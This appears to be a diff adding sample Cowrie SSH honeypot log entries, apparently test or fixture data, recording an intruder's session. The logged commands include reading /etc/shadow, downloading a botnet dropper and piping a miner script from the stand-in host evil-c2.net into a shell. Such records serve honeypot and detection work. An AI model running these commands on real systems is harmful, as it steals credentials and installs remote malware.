@@ -1,0 +1,8 @@
+{"timestamp":"2026-11-08T17:40:01.120000Z","eventid":"cowrie.session.connect","src_ip":"192.168.56.99","src_port":52100,"dst_ip":"192.168.56.20","dst_port":2222}
+{"timestamp":"2026-11-08T17:40:03.250000Z","eventid":"cowrie.login.success","src_ip":"192.168.56.99","username":"root","password":"password123"}
+{"timestamp":"2026-11-08T17:40:05.400000Z","eventid":"cowrie.command.input","src_ip":"192.168.56.99","input":"uname -a"}
+{"timestamp":"2026-11-08T17:40:07.150000Z","eventid":"cowrie.command.input","src_ip":"192.168.56.99","input":"cat /etc/shadow"}
+{"timestamp":"2026-11-08T17:40:09.800000Z","eventid":"cowrie.session.file_download","src_ip":"192.168.56.99","url":"http://evil-c2.net/botnet_dropper.elf","outfile":"var/lib/cowrie/downloads/a1b2c3d4"}
+{"timestamp":"2026-11-08T17:40:11.300000Z","eventid":"cowrie.command.input","src_ip":"192.168.56.99","input":"wget http://evil-c2.net/miner.sh -O - | sh"}
+{"timestamp":"2026-11-08T17:40:14.600000Z","eventid":"cowrie.direct-tcpip.request","src_ip":"192.168.56.99","dst_ip":"10.0.0.1","dst_port":445}
+
